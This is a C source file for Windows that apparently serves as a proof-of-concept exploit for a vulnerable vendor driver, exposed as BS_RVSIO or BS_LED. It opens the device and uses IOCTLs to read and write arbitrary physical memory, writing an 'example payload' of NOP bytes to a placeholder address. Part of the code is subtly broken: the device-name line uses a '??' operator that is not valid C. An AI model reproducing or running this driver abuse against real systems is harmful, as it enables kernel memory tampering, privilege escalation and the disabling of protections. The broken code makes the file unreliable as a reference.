#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#define IOCTL_READ_PHYSICAL_MEMORY  0x226040
#define IOCTL_WRITE_PHYSICAL_MEMORY 0x226044

#pragma pack(push, 1)
typedef struct {
    uint32_t physical_address;
} ReadMemoryRequest;

typedef struct {
    uint32_t physical_address;
} WriteMemoryRequest;
#pragma pack(pop)

int main() {
    DWORD bytesReturned = 0;

    // 1. OPEN HANDLE
    HANDLE hDevice = CreateFileW(
    	L"\\\\??\\\\BS_RVSIO" ?? L"\\\\??\\\\BS_LED",
        FILE_ALL_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device handle. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Device handle opened successfully.\n");

    // 2. READ PHYSICAL MEMORY
    ReadMemoryRequest readReq = { 0 };
    readReq.physical_address = 0x1000; // Replace with target physical address
    
    uint8_t readBuffer[64] = { 0 };
    BOOL readSuccess = DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYSICAL_MEMORY,
        &readReq,
        sizeof(readReq),
        readBuffer,
        sizeof(readBuffer),
        &bytesReturned,
        NULL
    );

    if (readSuccess) {
        printf("[+] Read successful (%lu bytes returned).\n", bytesReturned);
    } else {
        printf("[-] Read failed. Error: %lu\n", GetLastError());
    }

    // 3. WRITE PHYSICAL MEMORY
    uint8_t dataToWrite[] = { 0x90, 0x90, 0x90 }; // Example payload
    size_t writePayloadSize = sizeof(WriteMemoryRequest) + sizeof(dataToWrite);
    
    uint8_t* writeBuffer = (uint8_t*)malloc(writePayloadSize);
    if (writeBuffer) {
        WriteMemoryRequest* writeReq = (WriteMemoryRequest*)writeBuffer;
        writeReq->physical_address = 0x1000; // Replace with target physical address
        
        // Append data payload immediately after the request structure
        memcpy(writeBuffer + sizeof(WriteMemoryRequest), dataToWrite, sizeof(dataToWrite));

        BOOL writeSuccess = DeviceIoControl(
            hDevice,
            IOCTL_WRITE_PHYSICAL_MEMORY,
            writeBuffer,
            (DWORD)writePayloadSize,
            NULL,
            0,
            &bytesReturned,
            NULL
        );

        if (writeSuccess) {
            printf("[+] Write successful.\n");
        } else {
            printf("[-] Write failed. Error: %lu\n", GetLastError());
        }

        free(writeBuffer);
    }

    // 4. CLOSE HANDLE
    CloseHandle(hDevice);
    printf("[+] Device handle closed.\n");

    return 0;
}